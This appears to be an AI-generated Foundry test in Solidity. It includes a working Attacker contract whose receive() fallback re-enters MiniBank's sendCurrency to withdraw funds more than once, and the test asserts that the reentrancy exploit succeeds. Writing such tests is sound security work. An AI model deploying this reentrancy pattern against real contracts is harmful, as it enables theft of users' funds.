// Generation Time: 32,93s
// Input Tokens: 3383
// Output Tokens: 1454
// Reasoning Tokens: 1509


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 4);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        attackAmount = val;

        victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        attackAmount = val;

        victim.sendCurrency();

        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            victim.sendCurrency();
        }
    }
}
